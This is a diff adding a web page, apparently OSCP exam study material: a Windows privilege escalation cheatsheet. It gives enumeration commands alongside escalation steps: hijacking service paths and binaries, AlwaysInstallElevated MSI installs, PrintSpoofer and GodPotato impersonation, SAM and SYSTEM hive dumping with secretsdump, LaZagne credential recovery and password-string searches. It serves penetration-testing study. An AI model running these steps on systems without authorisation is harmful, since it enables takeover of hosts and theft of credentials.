@@ -1,0 +1,484 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="color-scheme" content="light"><title>Windows Privilege Escalation Cheatsheet — OSCP Reference</title><meta name="description" content="Plain OSCP reference: commands, explanations, interpretation and next checks."><link rel="canonical" href="https://armaanleg3nd.github.io/oscp/cheatsheets/windows-privesc/"><style>:root{color-scheme:light}html{color:#000;background:#fff;scroll-padding-top:1rem}body{margin:0;font:17px/1.5 Times New Roman,Times,serif}a,a:visited{color:#00e;text-decoration:underline}a:focus-visible,summary:focus-visible{outline-offset:3px;outline:2px solid #000}#reference-index{box-sizing:border-box;background:#fff;border-right:1px solid #888;width:19rem;padding:.75rem 1rem;position:fixed;inset:0 auto 0 0;overflow:auto}#reference-index>p:first-child{margin-top:0}nav{overflow-wrap:anywhere;font-size:15px;line-height:1.4}nav ul{margin:.35rem 0;padding-left:1.15rem}nav>ul{padding-left:1rem}nav li{margin:.3rem 0}nav summary{cursor:pointer}nav [aria-current=page]{font-weight:700}main{min-width:0;margin-left:19rem;padding:1rem 2rem 3rem}article{overflow-wrap:anywhere;min-width:0;max-width:85ch}h1{font-size:2em;line-height:1.15}h2{margin-top:1.7em;font-size:1.5em}h3{margin-top:1.5em;font-size:1.2em}h4,h5,h6{margin-top:1.3em;font-size:1em}pre,code{font-family:Courier New,Courier,monospace;font-size:.9em}pre{white-space:pre;overflow-wrap:normal;background:#f5f5f5;border:1px solid #aaa;padding:.7rem;overflow-x:auto}table{border-collapse:collapse;max-width:100%;margin:1rem 0;display:block;overflow-x:auto}th,td{vertical-align:top;text-align:left;border:1px solid #aaa;padding:.35rem .55rem}th{background:#eee}blockquote{border-left:2px solid #aaa;margin-left:0;padding-left:1rem}img,svg{max-width:100%;height:auto}article details{margin:1rem 0}article summary{cursor:pointer}.skip{z-index:2;background:#fff;padding:.5rem;position:fixed;top:0;left:-10000px}.skip:focus{left:0}@media (width<=700px){html{scroll-padding-top:calc(32dvh + 1rem)}#reference-index{z-index:1;border-bottom:1px solid #888;border-right:0;width:100%;height:32dvh;inset:0 0 auto}main{margin-left:0;padding:calc(32dvh + 1rem) 1rem 2rem}body{font-size:16px}}
+</style></head><body><a class="skip" href="#document">Skip to document</a><aside id="reference-index"><p><strong><a href="/oscp/">OSCP Reference</a></strong></p><nav aria-label="Reference index"><p><a href="/oscp/notes/ad-investigation/">AD Notes</a> · <a href="/oscp/notes/ad-investigation/quick-reference/">AD quick reference</a></p><details open><summary>On this page</summary><ul><li><a href="/oscp/cheatsheets/windows-privesc/#early-tool-assisted-pass">Early tool-assisted pass</a></li><li><a href="/oscp/cheatsheets/windows-privesc/#token-and-host-baseline">Token and host baseline</a></li><li><a href="/oscp/cheatsheets/windows-privesc/#effective-acls">Effective ACLs</a></li><li><a href="/oscp/cheatsheets/windows-privesc/#credentials-and-artifacts">Credentials and artifacts</a></li><li><a href="/oscp/cheatsheets/windows-privesc/#services">Services</a></li><li><a href="/oscp/cheatsheets/windows-privesc/#unquoted-service-paths">Unquoted service paths</a></li><li><a href="/oscp/cheatsheets/windows-privesc/#dllhelper-search">DLL/helper search</a></li><li><a href="/oscp/cheatsheets/windows-privesc/#scheduled-tasks-and-startup-consumers">Scheduled tasks and startup consumers</a></li><li><a href="/oscp/cheatsheets/windows-privesc/#alwaysinstallelevated-and-uac">AlwaysInstallElevated and UAC</a></li><li><a href="/oscp/cheatsheets/windows-privesc/#token-privileges">Token privileges</a></li><li><a href="/oscp/cheatsheets/windows-privesc/#software-drivers-and-kernel">Software, drivers and kernel</a></li><li><a href="/oscp/cheatsheets/windows-privesc/#automated-candidate-generation">Automated candidate generation</a></li><li><a href="/oscp/cheatsheets/windows-privesc/#failure-routing">Failure routing</a></li><li><a href="/oscp/cheatsheets/windows-privesc/#verify-and-re-enumerate">Verify and re-enumerate</a></li><li><a href="/oscp/cheatsheets/windows-privesc/#recover-supported-application-stores-with-lazagne">Recover supported application stores with LaZagne</a></li><li><a href="/oscp/cheatsheets/windows-privesc/#discover-and-recognize-candidates">Discover and recognize candidates</a><ul><li><a href="/oscp/cheatsheets/windows-privesc/#escalate-privileges-on-windows">Escalate privileges on Windows</a></li></ul></li></ul></details><ul><li><details><summary>Operational procedures</summary><ul><li><details><summary><a href="/oscp/reference/01-discovery-scanning/">01 — Discovery and scanning</a></summary><ul><li><a href="/oscp/reference/01-discovery-scanning/01-path-and-host-discovery/">Path and Host Discovery</a></li><li><a href="/oscp/reference/01-discovery-scanning/02-tcp-scanning/">TCP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/03-service-identification/">Service Identification</a></li><li><a href="/oscp/reference/01-discovery-scanning/04-udp-scanning/">UDP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/05-results-and-next-actions/">Scan Results and Next Actions</a></li><li><a href="/oscp/reference/01-discovery-scanning/06-windows-network-checks/">Windows Network Checks</a></li><li><a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">Scanner Alternatives and Web Baseline Checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/02-service-enumeration/">02 — Service enumeration</a></summary><ul><li><a href="/oscp/reference/02-service-enumeration/01-ftp/">FTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/02-ssh/">SSH Enumeration and Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/03-smtp/">SMTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/04-dns/">DNS Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/05-nfs-rpc/">NFS and Unix RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/06-smb-rpc/">SMB and MS-RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/07-snmp/">SNMP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/08-databases/">Database Enumeration and Privilege Boundaries</a></li><li><a href="/oscp/reference/02-service-enumeration/09-windows-remote-access/">Windows Remote-Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">HTTP and Web Application Mapping</a></li><li><a href="/oscp/reference/02-service-enumeration/11-ldap-kerberos/">LDAP and Kerberos Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/12-sip-irc/">SIP and IRC Triage</a></li><li><a href="/oscp/reference/02-service-enumeration/13-memcached-webdav/">Memcached and WebDAV</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/03-initial-access/">03 — Initial access</a></summary><ul><li><a href="/oscp/reference/03-initial-access/01-rdp-access/">RDP Access</a></li><li><a href="/oscp/reference/03-initial-access/02-web-file-handling/">Web File Read, Inclusion and Upload Paths</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/">Command and Manual SQL Injection</a></li><li><a href="/oscp/reference/03-initial-access/04-access-control-and-xss/">Web Access Control, API Logic and XSS</a></li><li><a href="/oscp/reference/03-initial-access/05-wordpress-and-ssrf/">WordPress and SSRF Paths</a></li><li><a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">Public Exploit Selection and Adaptation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/04-shells-transfers-credentials/">04 — Shells, transfers and credentials</a></summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File Transfer</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">Shells, Payloads and Session Repair</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential Classification, Cracking and Reuse</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/">File and Repository Hunting</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/05-python-tool-environments/">Python Tool Environments</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">Payload Execution Obstacles</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/05-local-privilege-escalation/">05 — Local privilege escalation</a></summary><ul><li><a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Linux Privilege Escalation</a></li><li><a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Windows Privilege Escalation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/06-ad-lateral-movement/">06 — AD and lateral movement</a></summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Active Directory Domain Mapping</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/">Windows and Domain Credential Access</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos and Identity Transitions</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/">Object Control, AD CS and Domain Compromise</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">Lateral Movement</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/">Conditional AD infrastructure and trust checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/07-pivoting-tunneling/">07 — Pivoting and tunneling</a></summary><ul><li><a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">Tunneling and Port Forwarding</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/08-evidence-reporting/">08 — Evidence and reporting</a></summary><ul><li><a href="/oscp/reference/08-evidence-reporting/01-attack-tracking-and-evidence/">Integrated Attack Tracking and Evidence</a></li></ul></details></li><li><a href="/oscp/reference/INDEX/">Complete operational task index</a></li></ul></details></li><li><details open><summary><a href="/oscp/cheatsheets/">Cheatsheets</a></summary><ul><li><a href="/oscp/cheatsheets/active-directory/">Active Directory Cheatsheet</a></li><li><a href="/oscp/cheatsheets/ad-investigation/">AD Investigation — Where to Look and What Output Means</a></li><li><a href="/oscp/cheatsheets/credentials-cracking/">Credentials and Cracking Cheatsheet</a></li><li><a href="/oscp/cheatsheets/discovery-scanning/">Discovery and Scanning Cheatsheet</a></li><li><a href="/oscp/cheatsheets/evidence-reporting/">Integrated Attack and Reporting Cheatsheet</a></li><li><a href="/oscp/cheatsheets/linux-privesc/">Linux Privilege Escalation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/payload-execution/">Payload Execution Obstacles Cheatsheet</a></li><li><a href="/oscp/cheatsheets/pivoting/">Pivoting and Tunneling Cheatsheet</a></li><li><a href="/oscp/cheatsheets/public-exploits/">Public Exploit Adaptation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/service-opportunities/">Service Opportunity Cheatsheet</a></li><li><a href="/oscp/cheatsheets/shells-payloads/">Shells and Payloads Cheatsheet</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/">Tool Command Reference</a></li><li><a href="/oscp/cheatsheets/tool-selection/">Tool Selection Matrix</a></li><li><a href="/oscp/cheatsheets/tools-and-scripts/">Tools and scripts by task</a></li><li><a href="/oscp/cheatsheets/web-exploitation/">Web Exploitation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/web-mapping/">Web Mapping Cheatsheet</a></li><li><a href="/oscp/cheatsheets/windows-privesc/" aria-current="page">Windows Privilege Escalation Cheatsheet</a></li></ul></details></li><li><details><summary>Study notes</summary><ul><li><a href="/oscp/notes/Attack_Strategy_Map/">Attack Strategy Map</a></li><li><a href="/oscp/notes/GetSH_Coverage/">getSH Source Coverage</a></li><li><a href="/oscp/notes/Master_Notes/">Master Notes</a></li><li><a href="/oscp/notes/Recognition_Practice/">Recognition practice</a></li><li><a href="/oscp/notes/Speedrun_Breakdown/">Attack-first OSCP speedrun breakdown</a></li><li><details><summary><a href="/oscp/notes/ad-investigation/">AD Notes — focused checks</a></summary><ul><li><a href="/oscp/notes/ad-investigation/acl/">An ACL shows a powerful right — can I actually use it?</a></li><li><a href="/oscp/notes/ad-investigation/asrep/">Can this account produce AS-REP roasting material?</a></li><li><a href="/oscp/notes/ad-investigation/bloodhound/">How do I turn a BloodHound graph into a verified path?</a></li><li><a href="/oscp/notes/ad-investigation/conditional/">When should I investigate AD CS, delegation or GPOs?</a></li><li><a href="/oscp/notes/ad-investigation/context/">What identity and domain am I actually using?</a></li><li><a href="/oscp/notes/ad-investigation/credential-sources/">On a controlled host, where could useful credentials exist?</a></li><li><a href="/oscp/notes/ad-investigation/failure/">A command failed or returned nothing — what can I conclude?</a></li><li><a href="/oscp/notes/ad-investigation/files/">I found a script or configuration file — what matters?</a></li><li><a href="/oscp/notes/ad-investigation/hosts/">Which computers can this identity access?</a></li><li><a href="/oscp/notes/ad-investigation/kerberoast/">I found a service account — is Kerberoasting useful?</a></li><li><a href="/oscp/notes/ad-investigation/managed/">Can I read a LAPS or gMSA secret?</a></li><li><a href="/oscp/notes/ad-investigation/material/">I found a secret — what kind is it and where can I use it?</a></li><li><a href="/oscp/notes/ad-investigation/movement/">I have credentials — which remote-access method fits?</a></li><li><a href="/oscp/notes/ad-investigation/object-change/">Which identity change follows from a validated object right?</a></li><li><a href="/oscp/notes/ad-investigation/policy/">How do I interpret password policy before testing credentials?</a></li><li><a href="/oscp/notes/ad-investigation/quick-reference/">AD — Quick Reference</a></li><li><a href="/oscp/notes/ad-investigation/read-output/">How to read command output</a></li><li><a href="/oscp/notes/ad-investigation/reenumerate/">I gained a new account or host — what do I check again?</a></li><li><a href="/oscp/notes/ad-investigation/replication/">Does this identity really have DCSync rights?</a></li><li><a href="/oscp/notes/ad-investigation/routes/">Is this an access failure or a missing route?</a></li><li><a href="/oscp/notes/ad-investigation/secure-baseline/">Expected behavior or useful weakness?</a></li><li><a href="/oscp/notes/ad-investigation/sessions/">A privileged user has a session — what does that mean?</a></li><li><a href="/oscp/notes/ad-investigation/shares/">Which shares and files should I inspect first?</a></li><li><a href="/oscp/notes/ad-investigation/smb-wmi/">SMB or WMI execution — what must be true first?</a></li><li><a href="/oscp/notes/ad-investigation/spns/">What does an SPN tell me to investigate?</a></li><li><a href="/oscp/notes/ad-investigation/tickets/">What does this Kerberos ticket actually allow?</a></li><li><a href="/oscp/notes/ad-investigation/users/">Where do I find useful users and group memberships?</a></li><li><a href="/oscp/notes/ad-investigation/winrm/">WinRM or RDP — why would this account be allowed in?</a></li></ul></details></li><li><details><summary>Method guides</summary><ul><li><a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></li><li><a href="/oscp/notes/methods/ad-mapping/">Map Active Directory attack paths</a></li><li><a href="/oscp/notes/methods/credentials/">Recover and use authentication material</a></li><li><a href="/oscp/notes/methods/discovery/">Discover attack surfaces</a></li><li><a href="/oscp/notes/methods/execution/">Resolve payload execution obstacles</a></li><li><a href="/oscp/notes/methods/integration/">Complete attacks and retain reproducible evidence</a></li><li><a href="/oscp/notes/methods/lateral-movement/">Move to another host</a></li><li><a href="/oscp/notes/methods/linux-privesc/">Escalate privileges on Linux</a></li><li><a href="/oscp/notes/methods/pivoting/">Reach internal services</a></li><li><a href="/oscp/notes/methods/public-exploits/">Select and adapt public exploits</a></li><li><a href="/oscp/notes/methods/services/">Extract opportunities from services</a></li><li><a href="/oscp/notes/methods/sessions-transfers/">Establish sessions and move files</a></li><li><a href="/oscp/notes/methods/web-exploitation/">Turn application weaknesses into access</a></li><li><a href="/oscp/notes/methods/web-mapping/">Map useful web behavior</a></li><li><a href="/oscp/notes/methods/windows-privesc/">Escalate privileges on Windows</a></li></ul></details></li></ul></details></li></ul></nav><hr><p><a href="/">Website</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference">Source</a></p></aside><main id="document" tabindex="-1"><article><h1 id="windows-privilege-escalation-cheatsheet">Windows Privilege Escalation Cheatsheet</h1>
+<p><a href="/oscp/cheatsheets/">← Cheatsheet index</a> | <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Full procedure</a> | <a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential use</a> | <a href="/oscp/notes/Attack_Strategy_Map/">Strategy map</a> | Study methods: <a href="/oscp/notes/methods/windows-privesc/">Escalate privileges on Windows</a></p>
+<pre><code class="language-text">TOKEN → CONTROLLED INPUT → EFFECTIVE RIGHT → PRIVILEGED CONSUMER → RUN-AS → TRIGGER → VERIFIED EFFECT
+</code></pre>
+<h2 id="early-tool-assisted-pass">Early tool-assisted pass</h2>
+<p>Use a reviewed, transferred build in the current host context. Save output and select a concrete finding; a highlight is not the elevated identity.</p>
+<pre><code class="language-cmd">whoami /all
+winPEASx64.exe log
+</code></pre>
+<p><a href="/oscp/notes/methods/windows-privesc/#first-pass-tools-and-findings">Tool-to-finding workflow</a>.</p>
+<h2 id="token-and-host-baseline">Token and host baseline</h2>
+<pre><code class="language-cmd">hostname
+whoami /all
+systeminfo
+ipconfig /all
+route print
+netstat -ano
+tasklist /svc
+query user
+net user
+net localgroup Administrators
+driverquery /v
+</code></pre>
+<pre><code class="language-powershell">Get-ComputerInfo | Select WindowsProductName,WindowsVersion,OsBuildNumber,OsArchitecture
+Get-HotFix | Sort InstalledOn -Descending
+Get-CimInstance Win32_Process | Select ProcessId,Name,ExecutablePath,CommandLine
+Get-CimInstance Win32_Service | Select Name,StartName,State,StartMode,PathName
+Get-CimInstance Win32_SystemDriver | Select Name,State,StartMode,PathName
+</code></pre>
+<blockquote>
+<p>Record integrity level, enabled/deny-only groups and enabled/present privileges. Medium-integrity Administrators membership is not a high-integrity process. Prefer CIM; WMIC may be absent. <code>Get-HotFix</code> is not a complete update inventory.</p>
+</blockquote>
+<h2 id="effective-acls">Effective ACLs</h2>
+<pre><code class="language-cmd">icacls "C:\Path\To\OBJECT"
+sc.exe sdshow SERVICE
+accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\OBJECT"
+accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE
+</code></pre>
+<p><code>F</code> full · <code>M</code> modify · <code>RX</code> read/execute · <code>R</code> read · <code>W</code> write · <code>D</code> delete · <code>I</code> inherited · <code>OI</code> object inherit · <code>CI</code> container inherit.</p>
+<blockquote>
+<p>File, directory, registry, service and task ACLs are distinct. Check the exact object/right and current enabled SID. MIC can still block write-up.</p>
+</blockquote>
+<h2 id="credentials-and-artifacts">Credentials and artifacts</h2>
+<pre><code class="language-cmd">cmdkey /list
+vaultcmd /list
+vaultcmd /listcreds:"Windows Credentials" /all
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+dir /s /b C:\Windows\Panther\*unattend*.xml C:\Windows\System32\Sysprep\*.xml 2>nul
+dir /s /b C:\Users\*.kdbx C:\Users\*.rdp C:\Users\id_rsa C:\Users\*.ppk 2>nul
+</code></pre>
+<pre><code class="language-powershell">Get-Content -LiteralPath (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
+Get-ChildItem C:\inetpub,C:\ProgramData,C:\Users -Recurse -File -ErrorAction SilentlyContinue |
+  Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd','.yml','.yaml','.json' } |
+  Select-String 'password|passwd|secret|token|connectionString|user id=' -CaseSensitive:$false
+</code></pre>
+<blockquote>
+<p><code>cmdkey</code> proves a target-bound stored entry, not plaintext. DPAPI artifacts need the protecting user/machine context. Classify identity/type/scope before reuse.</p>
+</blockquote>
+<h2 id="services">Services</h2>
+<pre><code class="language-powershell">Get-CimInstance Win32_Service | Select Name,StartName,State,StartMode,PathName
+</code></pre>
+<pre><code class="language-cmd">sc.exe qc SERVICE
+sc.exe sdshow SERVICE
+icacls "C:\Path\To\service.exe"
+icacls "C:\Path\To"
+accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE
+</code></pre>
+<blockquote>
+<p>Need control + higher <code>SERVICE_START_NAME</code> + trigger. <code>SERVICE_CHANGE_CONFIG</code>, start and stop are separate rights. Use <code>sc.exe</code> in PowerShell; bare <code>sc</code> may be <code>Set-Content</code>.</p>
+</blockquote>
+<details>
+<summary><strong>Change service path and restore</strong></summary>
+<pre><code class="language-cmd">sc.exe qc SERVICE
+sc.exe config SERVICE binPath= "C:\Windows\Temp\PAYLOAD_EXE"
+sc.exe stop SERVICE
+sc.exe start SERVICE
+sc.exe config SERVICE binPath= "ORIGINAL_BINARY_PATH"
+</code></pre>
+<blockquote>
+<p>Space after <code>binPath=</code> is required. Error 1053 may still follow payload execution; verify effect and restore.</p>
+</blockquote>
+</details>
+<details>
+<summary><strong>Replace writable binary</strong></summary>
+<pre><code class="language-cmd">copy /Y "C:\Path\To\service.exe" "C:\Windows\Temp\service.exe.backup"
+copy /Y "C:\Windows\Temp\PAYLOAD_EXE" "C:\Path\To\service.exe"
+sc.exe stop SERVICE
+sc.exe start SERVICE
+</code></pre>
+<blockquote>
+<p>Check parent delete/create rights, file locks, architecture and recovery.</p>
+</blockquote>
+</details>
+<h2 id="unquoted-service-paths">Unquoted service paths</h2>
+<pre><code class="language-powershell">Get-CimInstance Win32_Service |
+  Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '^\s*"' } |
+  Select Name,StartName,State,StartMode,PathName
+</code></pre>
+<pre><code class="language-cmd">icacls C:\
+icacls "C:\Program Files"
+icacls "C:\Program Files\Vendor App"
+sc.exe qc SERVICE
+</code></pre>
+<blockquote>
+<p>For <code>C:\Program Files\Vendor App\svc.exe</code>, prove an earlier missing prefix such as <code>C:\Program.exe</code> or <code>C:\Program Files\Vendor.exe</code> is creatable, service runs higher and trigger exists.</p>
+</blockquote>
+<h2 id="dllhelper-search">DLL/helper search</h2>
+<pre><code class="language-cmd">icacls "C:\Path\To\Application"
+sc.exe qc SERVICE
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
+</code></pre>
+<blockquote>
+<p>Need observed exact DLL request/load, selected writable searched directory, bitness/exports, privileged process and trigger. Account for redirection, API sets, SxS, loaded modules, KnownDLLs and application search flags. Procmon <code>CreateFile</code> + <code>.dll</code> + <code>NAME NOT FOUND</code> is useful when available.</p>
+</blockquote>
+<h2 id="scheduled-tasks-and-startup-consumers">Scheduled tasks and startup consumers</h2>
+<pre><code class="language-cmd">schtasks /query /fo LIST /v
+schtasks /query /tn "\FOLDER\TASK" /xml
+icacls "C:\Path\To\task-script.ps1"
+icacls "C:\Path\To"
+schtasks /run /tn "\FOLDER\TASK"
+</code></pre>
+<pre><code class="language-powershell">Get-ScheduledTask | ForEach-Object {
+  $t=$_
+  [pscustomobject]@{Task="$($t.TaskPath)$($t.TaskName)";User=$t.Principal.UserId;RunLevel=$t.Principal.RunLevel;Actions=($t.Actions|Out-String).Trim()}
+}
+</code></pre>
+<pre><code class="language-cmd">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+</code></pre>
+<blockquote>
+<p>Need writable consumed action/file plus higher principal and reliable trigger. <code>Highest</code> is relative to the task principal. <code>/run</code> accepted is not execution proof.</p>
+</blockquote>
+<h2 id="alwaysinstallelevated-and-uac">AlwaysInstallElevated and UAC</h2>
+<pre><code class="language-cmd">reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msiexec.exe /quiet /qn /i C:\Path\To\PAYLOAD.msi
+</code></pre>
+<blockquote>
+<p>Run only if <strong>both</strong> values are <code>0x1</code>.</p>
+</blockquote>
+<pre><code class="language-cmd">whoami /groups
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+</code></pre>
+<blockquote>
+<p>UAC bypass normally raises an already-admin filtered token; it is not ordinary standard-user escalation.</p>
+</blockquote>
+<h2 id="token-privileges">Token privileges</h2>
+<pre><code class="language-cmd">whoami /priv
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Privilege</th><th>Do not proceed until</th></tr></thead><tbody><tr><td><code>SeImpersonatePrivilege</code></td><td>Privileged auth trigger, build/arch/runtime and tool match</td></tr><tr><td><code>SeAssignPrimaryTokenPrivilege</code></td><td>Useful token and process-creation requirements match</td></tr><tr><td><code>SeBackupPrivilege</code></td><td>Privilege enabled and backup-aware read has useful target</td></tr><tr><td><code>SeRestorePrivilege</code></td><td>Restore-aware write feeds a privileged consumer</td></tr><tr><td><code>SeDebugPrivilege</code></td><td>Target process is useful and not protected from access</td></tr><tr><td><code>SeLoadDriverPrivilege</code></td><td>Driver is compatible/loadable/exploitable; crash risk accepted</td></tr><tr><td><code>SeTakeOwnershipPrivilege</code></td><td>Ownership can become DACL/content control over a consumed object</td></tr></tbody></table>
+<details>
+<summary><strong>Impersonation variants</strong></summary>
+<pre><code class="language-cmd">PrintSpoofer64.exe -i -c "cmd.exe"
+GodPotato-NET4.exe -cmd "cmd.exe /c whoami > C:\Windows\Temp\token-proof.txt"
+</code></pre>
+<blockquote>
+<p>Pick by actual prerequisite, not “Potato” name. Verify a SYSTEM process/effect with <code>whoami /all</code>.</p>
+</blockquote>
+</details>
+<details>
+<summary><strong>Backup privilege to local hashes</strong></summary>
+<pre><code class="language-cmd">reg save HKLM\SAM C:\Windows\Temp\SAM.hive
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
+</code></pre>
+<pre><code class="language-bash">impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
+</code></pre>
+<blockquote>
+<p>Matched hives produce local credential material, not automatic SYSTEM or remote authorization.</p>
+</blockquote>
+</details>
+<h2 id="software-drivers-and-kernel">Software, drivers and kernel</h2>
+<pre><code class="language-powershell">Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
+                 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue |
+  Select DisplayName,DisplayVersion,Publisher,InstallLocation
+</code></pre>
+<pre><code class="language-cmd">systeminfo
+driverquery /v
+</code></pre>
+<blockquote>
+<p>Order: deterministic config/credential → exact privileged app → exact driver → kernel last. Validate build, cumulative update, architecture, component/config, exploit source and stability. Avoid <code>Win32_Product</code>.</p>
+</blockquote>
+<h2 id="automated-candidate-generation">Automated candidate generation</h2>
+<pre><code class="language-cmd">winPEASx64.exe log
+Seatbelt.exe -group=system -outputfile="C:\Windows\Temp\seatbelt-system.txt"
+Seatbelt.exe -group=user -q -outputfile="C:\Windows\Temp\seatbelt-user.json"
+</code></pre>
+<pre><code class="language-powershell">powershell.exe -ExecutionPolicy Bypass -Command ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report TXT,HTML"
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+</code></pre>
+<blockquote>
+<p>Validate every highlight manually. PrivescCheck may skip checks when elevated; Seatbelt has no official prebuilt binaries; PowerUp upstream is archived. Tool block/failure routes to native checks.</p>
+</blockquote>
+<h2 id="failure-routing">Failure routing</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Symptom</th><th>Next action</th></tr></thead><tbody><tr><td>Service config denied</td><td>Service DACL/current token; then binary/DLL/config</td></tr><tr><td>No service restart right</td><td>Boot/dependency trigger or another path</td></tr><tr><td>Unquoted but no writable prefix</td><td>Disprove</td></tr><tr><td>DLL never requested</td><td>Search/load evidence, bitness and trigger</td></tr><tr><td>Task accepted/no effect</td><td>Action, conditions, working directory, LastTaskResult/history</td></tr><tr><td>Token tool fails</td><td>Privilege state, build, runtime and trigger prerequisite</td></tr><tr><td>Hashes/no higher shell</td><td>Credential type, account state, protocol and authorization</td></tr><tr><td>Enumerator blocked</td><td>Native checks; not “no findings”</td></tr></tbody></table>
+<h2 id="verify-and-re-enumerate">Verify and re-enumerate</h2>
+<pre><code class="language-cmd">whoami /all
+hostname
+ipconfig /all
+</code></pre>
+<blockquote>
+<p>Re-enumerate credentials, services, tasks, sessions, listeners, routes and domain context after every identity/integrity change.</p>
+</blockquote>
+<h2 id="recover-supported-application-stores-with-lazagne">Recover supported application stores with LaZagne</h2>
+<p>Use a reviewed build in the relevant user's context; system-protected stores can require elevation.</p>
+<pre><code class="language-cmd">REM Start with the relevant application family
+laZagne.exe browsers
+REM Broader collection with a text report
+laZagne.exe all -oN
+</code></pre>
+<p>Keep application, account and source with each value. Test it against the matching service. Empty output → check profile/decryption access and use manual config/history/vault checks. <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/#3-hunt-credentials-and-configuration">Full Windows credential hunting</a>.</p>
+<h2 id="discover-and-recognize-candidates">Discover and recognize candidates</h2>
+<p>Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries.</p>
+<h3 id="escalate-privileges-on-windows">Escalate privileges on Windows</h3>
+<details>
+<summary>Find: Establish Windows token, host and process context</summary>
+<p>At a new foothold inspect the complete token and host/service inventory before classifying the session as an administrator.</p>
+<pre><code class="language-cmd">whoami /all
+systeminfo
+tasklist /svc
+</code></pre>
+<blockquote>
+<p><strong>Recognize:</strong> An Administrators SID exists but this effective process is filtered/medium-integrity.</p>
+</blockquote>
+<blockquote>
+<p><strong>Validate next:</strong> Check actual enabled privileges and object operations in the process that will perform the action.</p>
+</blockquote>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+</details>
+<details>
